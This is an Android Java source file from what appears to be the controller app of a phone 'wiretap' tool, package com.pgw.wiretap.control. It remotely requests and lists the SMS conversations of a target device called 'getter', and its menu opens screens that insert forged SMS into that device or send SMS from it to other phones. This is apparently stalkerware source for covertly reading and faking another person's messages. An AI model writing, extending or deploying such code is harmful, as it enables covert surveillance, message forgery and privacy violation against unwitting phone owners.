package com.pgw.wiretap.control;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.provider.ContactsContract.Contacts.Data;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.BaseAdapter;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

import com.alibaba.fastjson.JSONObject;
import com.baidu.platform.comapi.map.p;
import com.pgw.wiretap.control.domain.ConversInfo;
import com.pgw.wiretap.control.domain.MsgHeader;
import com.pgw.wiretap.control.domain.MsgType;
import com.pgw.wiretap.control.domain.MyBaseAdapter;
import com.pgw.wiretap.control.utils.DialogUtils;
import com.pgw.wiretap.control.utils.JsonUtils;
import com.pgw.wiretap.control.utils.MsgUtils;

public class SmsActivity extends BaseActivity  {
	
	private String smsg;
	/**
	 * 短信会话的数据
	 */
	private List<ConversInfo> conversList;
	private String getter;
	/**
	 * 加载的界面
	 */
	private LinearLayout ll_loading;
	/**
	 * 没有短信显示的界面
	 */
	private TextView tv_no_sms;
	/**
	 * 短信列表的界面
	 */
	private ListView lv_convers_list;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_sms);
		getter = sp.getString("getter", "");
		if (TextUtils.isEmpty(getter)) {
			Intent intent=new Intent(this, HomeActivity.class);
			startActivity(intent);
			return;
		}
//		初始化组件
		ll_loading=(LinearLayout) findViewById(R.id.ll_loading);
		lv_convers_list=(ListView) findViewById(R.id.lv_convers_list);
		tv_no_sms=(TextView) findViewById(R.id.tv_no_sms);
		ll_loading.setVisibility(View.VISIBLE);
		MsgUtils.sendToService(getApplicationContext(), getter, MsgType.READ_SMS_CONVERS_LIST);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		MenuInflater menuInflater = getMenuInflater();
		menuInflater.inflate(R.menu.base_menu, menu);
		return true;
	}

	@Override
	public boolean onMenuItemSelected(int featureId, MenuItem item) {
		switch (item.getItemId()) {
		case R.id.m_refresh:
			break;
		case R.id.m_insertSms:
			Intent intent = new Intent(SmsActivity.this,
					SmsInsertActivity.class);
			intent.putExtra("type", MsgType.INSERT_SMS);
			intent.putExtra("getter", getter);
			startActivity(intent);
			break;
		case R.id.m_send_sms_to_other_phone:
			intent = new Intent(SmsActivity.this, SmsInsertActivity.class);
			intent.putExtra("getter", getter);
			intent.putExtra("type", MsgType.SEND_SMS_TO_OTHER_PHONE);
			startActivity(intent);
			break;
		}

		return super.onMenuItemSelected(featureId, item);
	}


	@Override
	protected void receive(int type,String  data) {
		if (type == MsgType.SMS_CONVERS_LIST) {
			// 短信会话列表
			 conversList = JsonUtils.json2list(data, ConversInfo.class);
			 lv_convers_list.setAdapter(new SmsConversAdapter());
			 ll_loading.setVisibility(View.GONE);

		}
	}
	
	/**
	 * 短信会话的适配器
	 */
	private class SmsConversAdapter extends MyBaseAdapter{
		@Override
		public int getCount() {
			return conversList.size();
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			final ConversInfo cInfo=conversList.get(position);
			System.out.println(cInfo);
			
			View view=View.inflate(SmsActivity.this, R.layout.list_item_convers_sms, null);
//			获取条目的控件
			ImageView iv_icon=(ImageView) view.findViewById(R.id.iv_icon);
			TextView tv_name=(TextView) view.findViewById(R.id.tv_name);
			TextView tv_body=(TextView) view.findViewById(R.id.tv_body);
			TextView tv_msg_count=(TextView) view.findViewById(R.id.tv_sms_msg_count);
			TextView tv_date=(TextView) view.findViewById(R.id.tv_sms_date);
//			填充数据
			iv_icon.setImageResource(R.drawable.ic_sms);
			String user=cInfo.getName()==null ? cInfo.getAddress(): cInfo.getName();
			tv_name.setText(user);
			String snippet=cInfo.getSnippet();
//			设置内容
			snippet=snippet.length()>14?snippet.substring(0, 10)+"...":snippet;
			tv_body.setText(snippet);
			tv_msg_count.setText(cInfo.getMessageCount()+"");
//			格式化时间
			String date=new SimpleDateFormat("yyyy-MM-dd").format(new Date(cInfo.getDate()));
			tv_date.setText(date);
			
			view.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {
//					进入短信列表
					Intent intent=new Intent(SmsActivity.this, SmsListActivity.class);
					intent.putExtra("address", cInfo.getAddress());
					intent.putExtra("name", cInfo.getName());
					intent.putExtra("getter", getter);
					startActivity(intent);
				}
			});
			
			return view;
		}
		
	}

}
